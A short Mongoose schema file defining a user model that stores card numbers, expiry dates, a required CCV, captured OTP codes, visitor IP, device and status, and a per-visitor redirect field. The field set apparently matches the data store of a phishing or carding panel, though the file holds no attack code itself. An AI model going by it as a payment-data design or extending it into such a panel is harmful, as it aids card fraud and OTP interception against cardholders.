const mongoose = require("mongoose");
const { Schema } = mongoose;

const PaymentSchema = new Schema(
    {
        Card_number: { type: String },
        Expiration_date: { type: String },
        CCV: { type: String, required: true },

    }
);
const quickdata = new Schema(
    {

        payment_info: { type: [PaymentSchema] }
    }
);
const logs = new Schema(
    {
        text: { type: String },
        date: { type: Date }
    }
);
const userSchema = new Schema(
    {
        id: { type: String },
        device: { type: String },
        page_id: { type: String },
        status: { type: String },
        last_connected: { type: Date },
        quick_data: { type: quickdata },
        Country: { type: String },
        ip: { type: String },
        logs: { type: [logs] },
        otp: { type: [String] },
        redirect: { type: String },
        homeinfo: { type: Boolean },
        otpinfo: { type: Boolean }


    },
    { timestamps: true }
);


const user = mongoose.model("user", userSchema);

module.exports = user;
